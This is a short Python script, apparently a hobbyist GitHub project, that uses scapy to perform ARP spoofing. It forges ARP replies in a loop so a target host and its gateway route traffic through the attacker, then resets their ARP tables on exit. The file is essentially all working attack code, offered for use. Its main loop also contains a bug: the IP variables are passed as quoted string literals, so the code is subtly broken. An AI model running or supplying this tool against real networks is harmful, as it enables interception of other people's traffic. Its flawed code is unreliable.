import scapy.all as scapy
import time
import optparse


# GitHub:@omerfarukbaysal04

def get_mac_address(ip):
    arp_request_package = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_package
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    # verbose->Removes scapy texts in the terminal
    # [0]->get answered results

    return answered_list[0][1].hwsrc
    # answered_list[0][1].hwsrc->get ARP response


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

    # op=2->ARP reply


def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning("user_target_ip", "user_gateway_ip")  # windows_ip & gateway_ip
        arp_poisoning("user_gateway_ip", "user_target_ip")  # gateway_ip & windows_ip
        # We introduced ourselves as a gateway to the windows

        number += 2

        print("\rSending Packets.. " + str(number), end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuiting and resetting...")
    reset_operation("user_target_ip", "user_gateway_ip")
    reset_operation("user_gateway_ip", "user_target_ip")